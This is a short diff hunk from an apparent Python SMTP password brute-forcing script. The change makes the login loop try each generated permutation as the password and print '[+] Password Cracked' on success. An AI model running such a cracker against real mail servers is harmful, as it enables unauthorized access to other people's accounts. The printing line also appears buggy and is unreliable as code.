@@ -20,7 +20,7 @@ def print_perms(chars, minlen, maxlen):
 
 
                try:
-                   smtpserver.login(user, password)
+                   smtpserver.login(user, perm)
 
                    print("[+] Password Cracked: %s") % symbols
                    break
